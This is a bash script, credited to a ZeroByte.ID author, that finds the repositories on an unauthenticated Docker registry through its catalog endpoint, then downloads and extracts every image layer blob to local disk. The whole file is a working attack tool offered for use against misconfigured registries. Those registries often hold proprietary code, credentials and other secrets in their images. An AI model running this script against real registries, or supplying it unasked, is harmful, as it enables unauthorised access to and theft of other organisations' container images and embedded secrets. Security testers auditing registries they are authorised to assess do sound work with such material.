#!/bin/bash
# If you found an Unauthenticated Docker Registry, you can dump the repos using this script
# This script will download blob per blob and automatically enumerate all repos through /v2/_catalog
# And the blobs automatically extracted to be linux file system/file
#
# Made by @xchopath
# ZeroByte.ID

echo " -------------------"
echo " | UNAUTHENTICATED |"
echo " | DOCKER REGISTRY |"
echo " |   BLOB DUMPER   |"
echo " -------------------"
echo ""

if [[ -z ${1} ]]; then
	echo " ERR! You did not input an URL of Docker Registry"
	echo " CMD: bash $(basename "$0") https://privdocker.reg:5000"
	exit
fi

DOCKER_REG_URL="${1}"

CHECK=$(curl -s "${DOCKER_REG_URL}/v2/_catalog")

if [[ ${CHECK} =~ '"repositories"' ]]; then
	echo " OK: DOCKER_REG_URL: ${DOCKER_REG_URL}"
else
	echo " ERR! DOCKER_REG_URL: ${DOCKER_REG_URL}"
	exit
fi

echo ""

REPOS=$(curl -sk "${DOCKER_REG_URL}/v2/_catalog" | jq -r '.repositories[]' 2> /dev/null)

for REPO in ${REPOS}
do
	echo " * Dump started: ${REPO}"
	TAG=$(curl -sk "${DOCKER_REG_URL}/v2/${REPO}/tags/list" | jq -r '.tags[]' | head -1)
	REPODIR=$(echo "${REPO}" | sed 's/\//-/g')
	if [[ ! -d ${REPODIR} ]]; then
		mkdir ${REPODIR}
	fi

	for BLOB in $(curl -sk "${DOCKER_REG_URL}/v2/${REPO}/manifests/${TAG}" | jq -r '.fsLayers[].blobSum')
	do
		echo " --- BLOB: ${BLOB}"
		TAR="$(echo "${REPO}" | sed 's/\//-/g')-$(echo ${BLOB} | sed 's/:/-/g').tar"
		curl -sk "${DOCKER_REG_URL}/v2/${REPO}/blobs/${BLOB}" --output ${REPODIR}/${TAR}
		tar -xf ${REPODIR}/${TAR} -C ${REPODIR}/
		if [[ -f ${REPODIR}/${TAR} ]]; then
			rm ${REPODIR}/${TAR}
		fi
	done
	echo ""
done
